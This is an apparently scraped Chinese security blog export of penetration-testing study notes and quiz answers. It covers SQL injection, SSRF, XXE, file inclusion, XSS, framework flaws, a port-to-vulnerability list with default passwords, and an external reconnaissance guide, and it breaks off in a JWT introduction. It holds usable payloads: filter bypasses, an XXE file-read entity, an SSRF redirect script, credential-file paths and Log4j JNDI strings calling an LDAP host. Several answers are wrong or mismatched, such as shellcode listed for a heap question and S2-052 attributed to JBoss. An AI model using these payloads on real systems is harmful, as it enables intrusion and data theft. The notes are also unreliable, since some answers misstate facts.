101.SQL注入2.失效的身份认证和会话管理3.跨站脚本攻击XSS4.直接引用不安全的对象5.安全配置错误6.敏感信息泄露7.缺少功能级的访问控制8.跨站请求伪造CSRF9.实验含有已知漏洞的组件10.未验证的重定向和转发\n\n\n\n2.sql注入sql注入原理\n\n产生SQL注入漏洞的根本原因在于代码中没有对用户输入项进行验证和处理便直接拼接\n到查询语句中。利用SQL注入漏洞，攻击者可以在应用的查询语句中插入自己的SQL代码并传递\n给后台SQL服务器时加以解析并执行。\n\nsql注入类型\n按照注入点类型分类可分为\n\n数字型注入\n字符型注入\n\n按照执行效果分类可分为\n\n盲注\n报错注入\n联合查询\n堆叠注入\n宽字节注入\n二次注入\n\nsql注入危害\n\n攻击者未经授权可以访问数据库中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露。\n可以对数据库的数据进行增加或删除操作，例如私自添加或删除管理员账号。\n如果网站目录存在写入权限，可以写入网页木马。攻击者进而可以对网页进行篡改，发布一些违法信息等。\n经过提权等步骤，服务器最高权限被攻击者获取。攻击者可以远程控制服务器，安装后门，得以修改或控制操作系统。\n\n报错注入常用函数\n\nupdatexml()\nextractvalue()\nfloor()\n\nsql注入绕过\n绕过空格（注释符/* */，%a0）括号绕过空格引号绕过（使用十六进制）逗号绕过（limit使用from或者offset）（substr使用from for属于逗号）比较符号（&lt;&gt;）绕过（使用greatest()）and=&amp;&amp;  or=||=  用 like 绕过大小写绕过双写绕过特殊编码绕过\n\n\n\nsql注入经常出现在什么地方\n\n登录界面\n删除处\n搜索框\n\nSql server 相关知识\nhttps://zhuanlan.zhihu.com/p/74546690\n3.文件上传文件上传的危害？\n\n文件上传漏洞危害极大因为可以直接上传恶意代码到服务器上，可能会造成服务器的网页篡改、网站被挂马、服务器被远程控制、被安装后门等严重的后果\n\n文件上传怎么防御\n\n客户端检测检测（js检测）\n服务端检测(MIME检测)\n服务端检测（扩展名检测）\n增加白名单\n\n文件上传怎么绕过(白名单，黑名单，前端等)？\n\n.htaccess绕过\n.user.ini绕过\n%00截断绕过\n\n3.SSRF漏洞\n漏洞原理 SSRF（Server-Side Request  Forgery，服务器端请求伪造）是一种由攻击者构造请求，由服务器端发起请求的安全漏洞，本质上是属于信息泄露漏洞。  ssrf攻击的目标是从外网无法访问的内部系统（正是因为他是有服务器端发起的，所以他能够请求到与他相连而与外网隔离的内部系统）  很多web应用都提供了从其他的服务器上获取数据的功能（百度识图，给出一串URL就能识别出图片）。  使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。  这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理，攻击远程和本地的服务器。 一般情况下，  SSRF攻击的目标是外网无法访问的内部系统，黑客可以利用SSRF漏洞获取内部系统的一些信息 。\n\nssrf漏洞利用\n\n能扫描内部网络，获取端口，服务信息\n攻击运行在内网或本地的应用程序。\n对内网web进行指纹识别\n对内部主机和端口发送请求包进行攻击\nfile协议读取本地文件\n\nSsrf漏洞防御\n\n限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求\n限制不能访问内网的IP，以防止对内网进行攻击\n屏蔽返回的详细信息\n\nSsrf漏洞绕过\n\n@符号绕过\nhttp://www.xxx.com@www.kxsy.work/\n\nIP地址转换\n例如：120.26.86.156二进制 = 1111000000110100101011010011100十六进制 = 0x781A569C十进制 = 2014992028\n\n转换短网址\nhttps://www.985.so/例：http://www.kxsy.work/ = http://u6.gg/ks69x\n\n特殊符号替换绕过\n例：http://www.kxsy.work/ = http://www。kxsy。work/localhost或者0.0.0.0\n\n302跳转绕过\n&lt;?php  $schema = $_GET[&#x27;s&#x27;];$ip     = $_GET[&#x27;i&#x27;];$port   = $_GET[&#x27;p&#x27;];$query  = $_GET[&#x27;q&#x27;];if(empty($port))&#123;      header(&quot;Location: $schema://$ip/$query&quot;); &#125; else &#123;    header(&quot;Location: $schema://$ip:$port/$query&quot;); &#125;\n\nxio.ip绕过，会解析到子域\nhttp://10.0.0.1.xip.io = 10.0.0.1www.10.0.0.1.xip.io= 10.0.0.1http://mysite.10.0.0.1.xip.io = 10.0.0.1foo.http://bar.10.0.0.1.xip.io = 10.0.0.110.0.0.1.xip.name resolves to 10.0.0.1www.10.0.0.2.xip.name resolves to 10.0.0.2foo.10.0.0.3.xip.name resolves to 10.0.0.3bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4\n\n用Enclosed alphanumerics绕过\n利用Enclosed alphanumericsⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; http://example.com\n\n4.XXE漏洞XXE漏洞原理\n\nXXE全称为XML External Entity Injection即XMl外部实体注入漏洞\n\nXXE漏洞触发点往往是可以上传xml文件的位置，没有对xml文件进行过滤，导致可加载恶意外部文件和代码，造成任意文件读取，命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害 要了解xxe漏洞，那么一定得先明白基础知识，了解xml文档的基础组成\nXXE漏洞利用\n在php环境下\n&lt;?php$xml=simplexml_load_string($_GET[&#x27;xml&#x27;]);print_r($xml);?&gt;\t\n\n将以下xml代码进行URL编码，读取文件\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE playwin [&lt;!ENTITY name SYSTEM &quot;file:///D:/phpStudy/PHPTutorial/WWW/1.txt&quot;&gt;]&gt;&lt;resume&gt;&lt;name&gt; &amp;name; &lt;/name&gt;&lt;/resume&gt;\n\n\n\n\n\nXxe漏洞支持的伪协议\n不同的程序支持协议不同\n5.文件包含漏洞文件包含的函数\nphp中有四种\nrequire() // 只在执行到此函数时才去包含文件，若包含的文件不存在产生警告，程序继续运行require_once() // 如果一个文件已经被包含过，则不会在包含它include() // 程序一运行文件便会包含进来，若包含文件不存在产生致命错误，程序终止运行include_once() // 如果一个文件已经被包含过，则不会在包含它\n\n\n\n文件包含支持的伪协议\nphp的支持php://filterphp://inputfile://phar://zip://data://\n\n\n\n文件包含利用\n包含日志文件getshell\n包含敏感文件\nC:\\boot.ini //查看系统版本C:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS配置文件C:\\Windows\\repair\\sam //存储系统初次安装的密码C:\\Program Files\\mysql\\my.ini //Mysql配置C:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql rootC:\\Windows\\php.ini //php配置信息C:\\Windows\\my.ini //Mysql配置信息C:\\Windows\\win.ini //Windows系统的一个基本系统配置文件\n\n\n\n\n\n6.Php命令执行，php代码执行相代码执行相关函数\nassert()eval()call_user_func()call_user_func_array()preg_replace()  //7.0版本后已经不存在array_map()Usort()\n\n命令执行相关函数\nsystem()exec()passthru()shell_exec()poopen()\n\n\n\n7.XSS漏洞XSS漏洞原理\n\nHTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号（&lt;）被看作是HTML标签的开始。当动态页面中插入的内容含有这些特殊字符时，正好你要访问的服务器并没有对用户的输入进行安全方面的验证，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞\n\nxss漏洞类型\n\n1.反射型\n反射型 XSS 一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。\n对于访问者而言是一次性的，具体表现在我们把我们的恶意脚本通过 URL 的方式传递给了服务器，而服务器则只是不加处理的把脚本“反射”回访问者的浏览器而使访问者的浏览器执行相应的脚本。反射型 XSS 的触发有后端的参与，要避免反射性 XSS，必须需要后端的协调，后端解析前端的数据时首先做相关的字串检测和转义处理。\n此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。2.存储型\n攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。\n存储型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。3.DOM型\n客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。基于DOM的XSS，也就是web server不参与，仅仅涉及到浏览器的XSS。比如根据用户的例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到 DOM-based XSS 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等。\n\nDom型xss和反射型xss的区别\nDOM型xss和别的xss最大的区别就是它不经过服务器，仅仅是通过网页本身的JavaScript进行渲染触发的\nXss漏洞的危害\n1.窃取用户Cookie2.后台增删改文章3.XSS钓鱼攻击4.利用XSS漏洞进行传播和修改网页代码5.XSS蠕虫攻击6.网站重定向7.获取键盘记录8.获取用户信息等\n\n\n\nXSS漏洞防御\n\n1、对输入和URL参数进行过滤(白名单和黑名单)\n检查用户输入的数据中是否包含一些特殊字符，如&lt;、&gt;、’、“等，发现存在特殊字符，将这些特殊字符过滤或者编码。2、HTML实体编码\n字符串js编码转换成实体html编码的方法（防范XSS攻击）https://www.cnblogs.com/dearxinli/p/5466286.html3、对输出内容进行编码\n在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。\n\n8.常见的解析漏洞Nginx\n\nhttps://blog.csdn.net/Spontaneous_0/article/details/129106641\n\nApache\n\nhttps://blog.csdn.net/weixin_44174581/article/details/119387616\n\nlls\n\nhttps://blog.csdn.net/weixin_43625577/article/details/91971796\n\n9.常见的漏扫工具支持扫描的漏洞类型 Xray\nXSS漏洞检测 (key: xss)SQL 注入检测 (key: sqldet)命令/代码注入检测 (key: cmd-injection)目录枚举 (key: dirscan)路径穿越检测 (key: path-traversal)XML 实体注入检测 (key: xxe)文件上传检测 (key: upload)弱口令检测 (key: brute-force)jsonp 检测 (key: jsonp)ssrf 检测 (key: ssrf)基线检查 (key: baseline)任意跳转检测 (key: redirect)CRLF 注入 (key: crlf-injection)Struts2 系列漏洞检测 (高级版，key: struts)Thinkphp系列漏洞检测 (高级版，key: thinkphp)POC 框架 (key: phantasm)\n\nAvws\n1.WebScanner：全站扫描，Web安全漏洞扫描2.Site Crawler：爬虫功能，遍历站点目录结构3.Target Finder：端口扫描，找出web服务器4.Subdomain Scanner：子域名扫描器，利用DNS查询5.Blind SQL Injector：盲注工具6.HTTP Editor：http协议数据包编辑器7.HTTP Sniffer：HTTP协议嗅探器8.HTTP Fuzzer：模糊测试工具9.Authentication Tester：Web认证破解工具10.Web Srevice Scanner：Web服务扫描器11.Web Srevice Editor：Web服务编辑器\n\n\n\n10.sqlmap工具参数的使用和含义\n-v 显示信息的级别，一共有六级：0：只显示python 错误和一些严重信息；1：显示基本信息（默认）；2：显示debug信息；3：显示注入过程的payload；4：显示http请求包；5：显示http响应头；7：显示http相应页面\n-u指定一个url连接，url中必须要有 ?xx=xxx 才行\n-r可以呀将一个post请求方式的数据保存在一个txt中msqlmap会通过post方式检验目标\n--data=Data指明参数是哪些。例：-u &quot;www.abc.com/index.php?id=1&quot; --data=&quot;name=1&amp;pass=2&quot;\n--random-agent使用随机user-agent进行测试。sqlmap有一个文件中储存了各种各样的user-agent，文件在sqlmap/txt/user-agent.txt 在level&gt;&#x3D;3时会检测user-agent注入。\n--os-shell创建一个对方操作系统的shell，metepreter或VNC\n--cookie指定测试时使用的cookie，通常在一些需要登录的站点会使用。例： -u &quot;www.abc.com/index.php?id=1&quot;\n\n11.一些常见漏洞Tomcat任意命令执行\nhttps://zhuanlan.zhihu.com/p/137686820\niis目录解析漏洞\n文件名解析漏洞\n畸形解析漏洞\niis短文件漏洞\nPUT任意文件写入\nhttps://blog.csdn.net/weixin_42918771/article/details/105178309\napache换行解析漏洞，多后缀解析漏洞，http路径穿越漏洞\n，路径穿越漏洞\nhttps://blog.csdn.net/weixin_44268918/article/details/129129214\nFastbin\n跟pwn有关，暂时没弄懂\nhttps://www.freebuf.com/articles/web/263598.html\n12.Cobalt strike,mimikatz工具的一些基础知识太多了，附上一个链接\nhttps://www.freebuf.com/articles/network/290134.html\n13.常见框架漏洞Jboss\n访问控制不严导致的漏洞\n反序列化导致的漏洞\n\nhttps://blog.csdn.net/m0_58434634/article/details/117434173\nweblogic\n弱口令漏洞\n任意文件上传漏洞\nXML Decoder反序列化漏洞\nwebligic-SSRF漏洞\njava反序列化漏洞\n\nhttps://www.cnblogs.com/-mo-/p/11503707.html\nthinkphp\n远程代码执行漏洞\n\nhttps://www.cnblogs.com/lingzhisec/p/15728886.html\nStruts2https://blog.csdn.net/HBohan/article/details/122667891\nShiro\n反序列化漏洞\n\nhttps://www.freebuf.com/vuls/283810.html\n14.常见端口对应的漏洞20：FTP服务的数据传输端口21：FTP服务的连接端口，可能存在  弱口令暴力破解22：SSH服务端口，可能存在 弱口令暴力破解23：Telnet端口，可能存在 弱口令暴力破解25：SMTP简单邮件传输协议端口，和 POP3 的110端口对应43：whois服务端口53：DNS服务端口(TCP/UDP 53)67/68：DHCP服务端口69：TFTP端口，可能存在弱口令80：HTTP端口，常见web漏洞88：Kerberos协议端口110：POP3邮件服务端口，和SMTP的25端口对应135：RPC服务137/138： NMB服务139：SMB/CIFS服务143：IMAP协议端口161/162: Snmp服务，public弱口令389：LDAP目录访问协议，有可能存在注入、弱口令，域控才会开放此端口443：HTTPS端口，心脏滴血等与SSL有关的漏洞445：SMB服务端口，可能存在永恒之蓝漏洞MS17-010512/513/514：Linux Rexec服务端口，可能存在爆破636：LDAPS目录访问协议，域控才会开放此端口873：Rsync ，可能存在Rsync未授权访问漏洞，传送门：rsync 未授权访问漏洞1080：socket端口，可能存在爆破1099：RMI，可能存在 RMI反序列化漏洞1352：Lotus domino邮件服务端口，可能存在弱口令、信息泄露1414：IBM WebSphere MQ服务端口1433：SQL Server对外提供服务端口1434：用于向请求者返回SQL Server使用了哪个TCP/IP端口1521：oracle数据库端口2049：NFS服务端口，可能存在NFS配置不当2181：ZooKeeper监听端口，可能存在 ZooKeeper未授权访问漏洞2375：Docker端口，可能存在 Docker未授权访问漏洞2601:   Zebra ，默认密码zebr3128:   squid ，匿名访问（可能内网漫游)3268：LDAP目录访问协议，有可能存在注入、弱口令3306：MySQL数据库端口，可能存在 弱口令暴力破解3389：Windows远程桌面服务，可能存在 弱口令漏洞 或者 CVE-2019-0708 远程桌面漏洞复现3690：SVN服务，可能存在SVN泄漏，未授权访问漏洞4440：Rundeck，弱口令admin4560：log4j SocketServer监听的端口，可能存在 log4j&lt;=1.2.17反序列化漏洞（CVE-2019-17571）4750：BMC，可能存在 BMC服务器自动化RSCD代理远程代码执行(CVE-2016-1542)4848：GlassFish控制台端口，可能存在弱口令admin/adminadmin5000：SysBase/DB2数据库端口，可能存在爆破、注入漏洞5432：PostGreSQL数据库的端口5632：PyAnywhere服务端口，可能存在代码执行漏洞5900/5901：VNC监听端口，可能存在 VNC未授权访问漏洞5984：CouchDB端口，可能存在 CouchDB未授权访问漏洞6379：Redis数据库端口，可能存在Redis未授权访问漏洞，传送门：Redis未授权访问漏洞7001/7002：Weblogic，可能存在Weblogic反序列化漏洞，传送门：Weblogic反序列化漏洞7180：Cloudera manager端口8000：JDWP，可能存在JDWP远程代码执行漏洞。8069：Zabbix服务端口，可能存在Zabbix弱口令导致的Getshell漏洞8080：Tomcat、JBoss，可能存在Tomcat管理页面弱口令Getshell，JBoss未授权访问漏洞，传送门：Tomcat管理弱口令页面Getshell8080-8090：可能存在web服务8089：Jetty、Jenkins服务端口，可能存在反序列化，控制台弱口令等漏洞8161：Apache ActiveMQ后台管理系统端口，默认口令密码为：admin:admin ，可能存在CVE-2016-3088漏洞，传送门：Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）9000：fastcgi端口，可能存在远程命令执行漏洞9001：Supervisord，可能存在Supervisord远程命令执行漏洞(CVE-2017-11610)，传送门：Supervisord远程命令执行漏洞(CVE-2017-11610)9043/9090：WebSphere，可能存在WebSphere反序列化漏洞9200/9300：Elasticsearch监听端口，可能存在 Elasticsearch未授权访问漏洞10000：Webmin-Web控制面板，可能存在弱口令10001/10002：JmxRemoteLifecycleListener监听的，可能存在Tomcat反序列化漏洞，传送门：Tomcat反序列化漏洞(CVE-2016-8735)11211：Memcached监听端口，可能存在 Memcached未授权访问漏洞27017/27018：MongoDB数据库端口，可能存在 MongoDB未授权访问漏洞50000：SAP Management Console服务端口，可能存在 运程命令执行漏洞。50070：Hadoop服务端口，可能存在 Hadoop未授权访问漏洞61616：Apache ActiveMQ服务端口，可能存在 Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现60020：hbase.regionserver.port，HRegionServer的RPC端口60030：hbase.regionserver.info.port，HRegionServer的http端口\n\n\n\n\n\n15.一些最新的漏洞Log4j2https://juejin.cn/post/7202514143341002789\nspring-core-rce-2022-03-29https://blog.csdn.net/weixin_45632448/article/details/124190382\n16.常见的web漏洞\n任意文件上传\n任意文件下载\n逻辑漏洞\n反序列化漏洞\n\n\n练习思考题1.堆溢出覆盖top chunk的大小(house of force)的说法有哪些？\nWindows Meterpreter Reverse TCP shellcode：这种 shellcode 可以与 Metasploit 的 Meterpreter 模块配合使用，实现远程代码执行、获取系统信息等功能。\nWindows Reverse TCP shellcode：这种 shellcode 可以在 Windows 系统上运行，将一个远程 shell 连接回攻击者的主机。\nWindows Reverse HTTP shellcode：这种 shellcode 可以在 Windows 系统上运行，将一个 HTTP 连接回攻击者的主机。\nBeacon Payload shellcode：这种 shellcode 可以使用 Cobalt Strike 的 Beacon 功能，实现命令执行、文件传输等功能。\nLinux Reverse TCP shellcode：这种 shellcode 可以在 Linux 系统上运行，将一个远程 shell 连接回攻击者的主机。\nMac Reverse TCP shellcode：这种 shellcode 可以在 Mac 系统上运行，将一个远程 shell 连接回攻击者的主机。\n\n2.6379,8009端口对应的漏洞是\n6379是redis未授权访问漏洞\n8009是Apache-Tomcat-Ajp漏洞，tomcat默认开启ajp服务（8009端口）\n\n3.Cobalt strike 可以生成哪些类型的shellcode?搜不到。。。\n4.Apache 文件解析漏洞的原理？\napache的解析漏洞依赖于一个特性：apache默认一个文件可以有多个以点分割的后缀，比如test.php.abc，当最右边的后缀无法识别（不在mime.types文件内），则继续向左识别，知道识别到合法后缀才能进行解析，与windows不同，apache对文件的名解析不是仅仅认识最后一个后缀名，而是从右向左，依此识别，直到遇到自己可以解析的文件为止。\n\n当phpinfo.php被禁止时，phpinfo.php.abc可执行\n5. 什么中间件存在短文件名漏洞？iis\n6.xxe漏洞各个语言支持的伪协议有哪些可利用php:&#x2F;&#x2F;filter伪协议\n7.S2_052漏洞是由于什么造成的？此漏洞主要是由于JBoss中 &#x2F;jmx-console&#x2F;HtmlAdaptor 路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到JMX控制台，并在其中执行任何功能。\n8.Weblogic 常见的漏洞有哪些？\nXMLDecoder反序列化漏洞\nT3协议反序列化漏洞\n未授权访问漏洞\n命令执行漏洞\nIIOP协议反序列化漏洞\nSSRF漏洞\n\n9.Jboss 常见的漏洞有哪些？\n访问控制不严导致的漏洞\n反序列化导致的漏洞\n\n10.Struts2 常见的漏洞有哪些？\n反序列化漏洞\n\n11.Fastbin 怎么利用？使用流程如下：\n\n申请同样大小的两个内存块，并将它们都释放，这样这两个内存块就会被放入 Fastbin 链表中。\n重新申请同样大小的内存块，此时 glibc 会从 Fastbin 链表中返回其中一个内存块的地址，作为本次申请的内存块。\n利用本次申请返回的内存块地址，修改其中保存的值为 Fastbin 链表中未释放的内存块的地址。\n再次申请同样大小的内存块，此时 glibc 会从 Fastbin 链表中返回之前修改过的内存块地址，作为本次申请的内存块。\n\n12.Ssrf 攻击的目标为？外网无法访问的内部系统\n13.ssrf 是否可以通过过滤get或post参数进行防御？不行\n14.Log4j 怎么绕过？\n不出现port，避免被waf匹配ip:port\n$&#123;jndi:ldap:192.168.1.1/a&#125; $&#123;jndi:ldap:192.168.1.1:/a&#125; 注意此时需要ldap服务端口为389\n\n\n\n对IP添加包裹\n$&#123;jndi:ldap://[192.168.34.96]/a&#125; $&#123;jndi:ldap://[192.168.34.96]]/a&#125;  LdapURL取出&quot;[ip]&quot;，LdapCtx去除[]获得ip，两种情况下端口都是389\n\n15.ogg是否是php的伪协议？不是。OGG是一种开放格式的媒体容器，通常用于存储音频和视频文件。它不是PHP的伪协议，PHP的伪协议是一种特殊的协议，用于在PHP中访问各种资源，如文件、网络资源等。PHP的伪协议以特殊的前缀开头，例如file:&#x2F;&#x2F;表示文件协议，http:&#x2F;&#x2F;表示HTTP协议等。\n16. Zip:&#x2F;&#x2F;伪协议利用对应的php版本号为？zip:// 伪协议是在 PHP 5.2.0 版本中引入的，因此在该版本及更高版本的 PHP 中都可以使用。该伪协议允许 PHP 脚本以与本地文件系统相同的方式访问 ZIP 存档文件中的文件。\n17.文件上传怎么绕过黑名单.asp后缀的过滤？18.Nginx,apache是否存在弱口令？均存在\n19.Dom xss和反射型xss的区别是什么？\nDOM 型 XSS 漏洞和反射型 XSS 漏洞的区别在于攻击者注入恶意脚本的位置不同。反射型 XSS 漏洞将恶意脚本注入到响应页面中，而 DOM 型 XSS 漏洞将恶意脚本注入到浏览器的 DOM 中。\n\n20.Ms17_010漏洞是那个端口造成的？445端口\n21.Sqlmap 中要使用随机user-agent应该使用什么参数？--random-agent\n\n\n\n22.Xp_cmdshell 是那个数据库中含有的？ Microsoft SQL Server 数据库\n23.Symlink函数是否可以执行系统命令？不可以\n24.Samba wannacry溢出漏洞怎么修复？\n升级 Samba：升级到最新版本的 Samba，这将修复许多与安全有关的漏洞，包括 EternalBlue 漏洞。\n禁用 SMBv1：在 Samba 服务器上禁用 SMBv1 协议。这是因为 WannaCry 利用的是 SMBv1 协议的漏洞。在 Windows 系统上禁用 SMBv1 协议同样可以减少系统受到攻击的风险。\n更新操作系统：更新 Windows 操作系统以修补 SMBv1 漏洞。\n加强安全设置：加强 Samba 服务器的安全设置，包括访问控制、身份验证和日志记录等。例如，可以配置防火墙规则以限制对 Samba 服务器的访问，并配置强密码策略以增强身份验证的安全性。\n实施安全性检查：定期对 Samba 服务器进行安全性检查，以确保其处于最新的安全状态，并及时修复发现的漏洞。\n\n","categories":["复现"]},{"title":"外网信息搜集","url":"/2023/06/19/%E5%A4%96%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/","content":"外网信息搜集前言渗透测试流程一般来说渗透测试流程 \n外网信息收集&#x3D;&gt;入口权限突破&#x3D;&gt;内网信息收集&#x3D;&gt;权限提升&#x3D;&gt;横线渗透&#x3D;&gt;权限维持&#x3D;&gt;痕迹清理\n信息搜集在第一位，也是任务最杂最繁重的。这一部分很关键，我们必须做好\n外网信息搜集前言渗透测试流程一般来说渗透测试流程 \n外网信息收集&#x3D;&gt;入口权限突破&#x3D;&gt;内网信息收集&#x3D;&gt;权限提升&#x3D;&gt;横线渗透&#x3D;&gt;权限维持&#x3D;&gt;痕迹清理\n信息搜集在第一位，也是任务最杂最繁重的。这一部分很关键，我们必须做好\n信息搜集主域名查询主域名查询可分为备案域名查询和未备案域名查询\n\n备案域名查询\n\nhttps://beian.miit.gov.cn\n\n\n未备案域名查询\n通过目标已知的网站获取\n有些企业会把自己的其他业务站点放在网站尾部，里面也许会包含未备案的站点。\n通过fofa等网络空间测绘工具\n根据相关的语法，可以得到自己想要的信息\n\n\n\n子域名获取这里一般用工具进行，我用过的工具有layer，但这个属于爆破了不推荐\n目前网上主流的有OneForAll等，这里贴个网址https://github.com/shmilylty/OneForAll\n这里简单说明一些主域名与子域名的关系\n\n子域名是主域名的下一级或下下级域名，主域名的改动会对下面的子域名造成影响：\n1.主域名解析状态异常时，也会影响子域名的正常使用；\n2.对主域名使用通配符证书，其下的子域名也可受到SSL证书的保护；\n3.对主域名进行解析设置，在设置为泛解析的情况下，所有子域名都会指向主域名同样的IP。\n4.子域名与子域名之间一般权限都是相互分开的，不会彼此相互影响。\n\n端口扫描原理：尝试与目标主机建立连接，如果目标主机有回复则说明端口开放。 \n常用工具：nmap，goby，等\n我一般用nmap比较多，这里贴一个常用的命令\nnmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -p 1-65535 -iL ip.txt -oX output.xml \n\n在线查询网站\n\n在线端口扫描器：http://duankou.wlphp.com/\n站长在线工具：http://www.all-tool.cn/Tools/portblast/\nMaTools：https://www.matools.com/port\n\n指纹识别1、CMS信息：比如大汉CMS、织梦、帝国CMS、phpcms、ecshop等；\n\n2、前端技术：比如HTML5、jquery、bootstrap、pure、ace等；\n\n3、Web服务器：比如Apache、lighttpd, Nginx, IIS等；\n\n4、应用服务器：比如Tomcat、Jboss、weblogic、websphere等；\n\n5、开发语言：比如PHP、Java、Ruby、Python、C#等；\n\n6、操作系统信息：比如linux、win2k8、win7、kali、centos等；\n\n7、CDN信息：是否使用CDN，如cloudflare、360cdn、365cyd、yunjiasu等；\n\n8、WAF信息：是否使用waf，如Topsec、Jiasule、Yundun等；\n\n9、IP及域名信息：IP和域名注册信息、服务商信息等；\n\n10、端口信息：有些软件或平台还会探测服务器开放的常见端口。\n\n这里推荐一些在线网站和工具\n\n\n云悉\nhttps://www.yunsee.cn/\n在线识别\nhttp://whatweb.bugscaner.com/look/\nfofa,goby测绘\nhttps://fofa.so/\nwappalyzer插件\n火狐，谷歌插件\n潮汐指纹识别\nhttp://finger.tidesec.net/\n数字观星\nhttps://fp.shuziguanxing.com/#/\n一些工具\nhttps://mp.weixin.qq.com/s/lHIJmIWbm8ylK6yjjmmNkg\n\n\n（潮汐指纹识别超好用压！）\n空间搜索引擎有时运用空间搜索引擎，可以在最初拿到确定目标时，就找到弱点。\n目前比较常见的空间搜索引擎有 Fofa、Shodan、360 夸克、奇安信全球鹰、知道创宇 ZoomEye 等等。\n目录获取工具：dirsearch，ffuf，御剑\nffuf 更侧重于 FFUZ，不过不管是目录扫描还是 FFUZ ，扫描的结果都在于字典，Github 上 4k 多个 star 的字典：https://github.com/TheKingOfDuck/fuzzDicts\n邮箱地址获取邮箱地址比较常用的方法有直接通过搜索引擎找网上公开的邮箱信息，这种往往会指向目标的网站中，比如目标某个网页的附件中包含有邮箱等信息。\n之外还可以使用 Github 搜索目标公司开发者在代码中注释的邮箱信息，其实不太明白为什么开发者都喜欢把自己的邮箱注释到代码里。\n也可以通过领英找到目标公司的员工姓名，通过「拼音+@公司域名」的方法去构造员工邮箱。\n也有一些网站可以查询邮箱，这种比较方便，比如以下网站：\nhttps://www.skymem.info/\nhttps://app.snov.io/domain-search\nhttps://www.email-format.com/i/search/\n另外如果收集到了目标的 outlook 站点，也可以尝试去爆破邮箱用户名\n(这方面不太懂，没怎么试过)\n真实ip由于cdn的存在，我们有时不能直接得到目标的真实ip\ncdn原理：\n就是将源站的资源缓存CDN各个节点上，当请求命中了某个节点的资源缓存时，立即返回客户端，避免每个请求的资源都通过源站获取，避免网络拥塞、缓解源站压力，保证用户访问资源的速度和体验。\n由CDN的原理，不同的地方去Ping服务器，如果IP不一样，则目标网站肯定使用了CDN。这里推荐一个网站可以多个地点ping服务器，\nhttps://asm.ca.com/en/ping.php\nhttps://ping.chinaz.com/\nhttp://www.webkaka.com/ping.aspx\n\n\n二级域名发法\n\n目标站点一般不会把二级域名放在cdn上通过在线工具如站长帮手，收集子域名，确定了没使用CDN的二级域名后。本地将目标域名绑定到同IP（修改host文件），如果能访问就说明目标站与此二级域名在同一个服务器上；如果两者不在同一服务器也可能在同C段，扫描C段所有开80端口的IP，然后挨个尝试。\n\nnslookup法\n\nhttp://tool.chinaz.com/nslookup\n找国外的比较偏僻的DNS解析服务器进行DNS查询，因为大部分CDN提供商只针对国内市场，而对国外市场几乎是不做CDN，所以有很大的几率会直接解析到真实IP。\n\nping法\n\n直接ping example.com而不是www.example.com，因为现有很多CDN厂商基本只要求把www.example.com cname到CDN主服务器上去，那么直接ping example.com有可能直接获得真实IP。\nc段查询许多企业在办理宽带时，运营商为企业分配的IP往往都是连续的，所以我们可以通过被测目标的其他公网服务器进行横向到被测目标\n常用在线C段查询网站：\n鹰图：https://hunter.qianxin.com/  FOFA：https://fofa.info/toLogin  360空间测绘：https://quake.360.net/#/index  云溪：https://www.yunsee.cn/\n\n\n\nwhois可以查询联系人，联系邮箱，创建时间，过期时间等，有利于后面进一步的信息手机\n\n","categories":["学习"]},{"title":"浅析JWT","url":"/2022/01/13/%E6%B5%85%E6%9E%90JWT/","content":"浅析JWTJWT简介\nJson web token (JWT)，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519)。该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。\n\n我们在学习jwt的同时，也需要了解传统session认证\nsession认证\n我们知道，http协议本身是一种无状态的协议，而这就意味着如果用户向我们的应用提供了用户名和密码来进行用户认证，那么下一次请求时，用户还要再一次进行用户认证才行，因为根据http协议，我们并不能知道是哪个用户发出的请求，所以为了让我们的应用能识别是哪个用户发出的请求，我们只能在服务器存储一份用户登录的信息，这份登录信息会在响应时传递给浏览器，告诉其保存为cookie，以便下次请求时发送给我们的应用，这样我们的应用就能识别请求来自哪个用户了，这就是传统的基于session认证。\n\n这种传统的session我们很难得到拓展，并且session相关的数据是保存在服务器中，随着用户数量的增加，服务器的载荷也就越大，这时候许多问题就暴露了出来\n\nSession：每个用户经过我们的应用认证之后，我们的应用都要在服务端做一次记录，以方便用户下次请求的